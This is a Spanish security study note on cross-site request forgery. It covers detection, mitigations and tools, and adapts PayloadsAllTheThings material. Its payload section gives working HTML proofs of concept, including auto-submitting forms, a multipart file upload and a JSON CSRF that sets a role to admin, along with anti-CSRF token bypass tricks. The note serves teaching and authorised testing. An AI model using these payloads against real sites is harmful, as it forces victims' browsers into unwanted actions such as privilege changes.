---
tags:
  - seguridad-web
  - owasp
  - csrf
aliases:
  - CSRF
  - XSRF
  - Cross-Site Request Forgery
---

# CSRF (Cross-Site Request Forgery)

**El Cross-Site Request Forgery (CSRF/XSRF)** obliga a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web, aprovechando que el navegador envía sus cookies de sesión automáticamente.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Cuando un usuario inicia sesión, su identificador de sesión queda en una cookie que el navegador adjunta a **toda** petición a ese sitio, incluso si la petición la dispara otra página. Si un sitio malicioso provoca una petición a la app vulnerable, esta se procesa como si la hubiera hecho el usuario legítimo. CSRF ataca acciones que **cambian estado** (cambiar email, contraseña, rol, transferencias), no la lectura de datos, porque el atacante no ve la respuesta.

## Detección y pruebas
- Busca peticiones que cambian estado y comprueba si dependen solo de la cookie de sesión.
- Verifica la ausencia o debilidad del token anti-CSRF: ¿se valida?, ¿está ligado a la sesión del usuario?, ¿se valida en todos los métodos?
- Comprueba el atributo `SameSite` de las cookies y la validación de `Referer`/`Origin`.
- **XSRFProbe** automatiza la auditoría.

## Explotación / payloads

**GET — con interacción / sin interacción:**

```html
<a href="https://www.example.com/api/setusername?username=CSRFd">Haz clic</a>
<img src="https://www.example.com/api/setusername?username=CSRFd">
```

**POST — autoenvío sin interacción:**

```html
<form id="poc" action="https://www.example.com/api/setusername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
</form>
<script>document.getElementById("poc").submit();</script>
```

**POST con subida de fichero (multipart):**

```html
<script>
function launch(){
  const dT = new DataTransfer();
  dT.items.add(new File(["CSRF-filecontent"], "CSRF-filename"));
  document.xss[0].files = dT.files;
  document.xss.submit();
}
</script>
<form style="display:none" name="xss" method="post" action="https://www.example.com/upload" enctype="multipart/form-data">
  <input type="file" name="file"/>
</form>
<button onclick="launch()">Enviar</button>
```

**JSON CSRF — `text/plain` para evitar el preflight CORS** (truco del input con nombre/valor partidos para fabricar el JSON):

```html
<form id="poc" action="https://www.example.com/api/setrole" enctype="text/plain" method="POST">
  <input type="hidden" name='{"role":"admin", "other":"' value='"}' />
</form>
<script>document.getElementById("poc").submit();</script>
```

**Bypass de validación de tokens** (técnicas habituales en labs):
- Si el token solo se valida en POST, prueba el mismo endpoint vía **GET**.
- Si solo se valida cuando el parámetro **está presente**, elimínalo del todo.
- Si el token **no está ligado a la sesión**, reutiliza uno de otra cuenta.
- Si la validación de `Referer` se rompe al faltar la cabecera, suprímela con `<meta name="referrer" content="no-referrer">`.

## Mitigación
- **Tokens anti-CSRF** únicos por sesión (patrón synchronizer token), impredecibles y validados en el servidor en toda petición que cambie estado.
- Cookies de sesión con **`SameSite=Lax` o `Strict`** para que no se envíen en peticiones cross-site.
- Verificar las cabeceras **`Origin`/`Referer`** del lado servidor.
- Re-autenticación o confirmación para acciones sensibles (cambio de contraseña, pagos).
- No usar GET para acciones que modifican estado.

## Herramientas
- **XSRFProbe** — auditoría y explotación de CSRF.
- Burp Suite (generador de PoC de CSRF).

---
🔗 Relacionado: [[XSS (Cross-Site Scripting)]] · [[SSRF (Server-Side Request Forgery)]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Cross-Site Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery) (MIT, © Swissky)
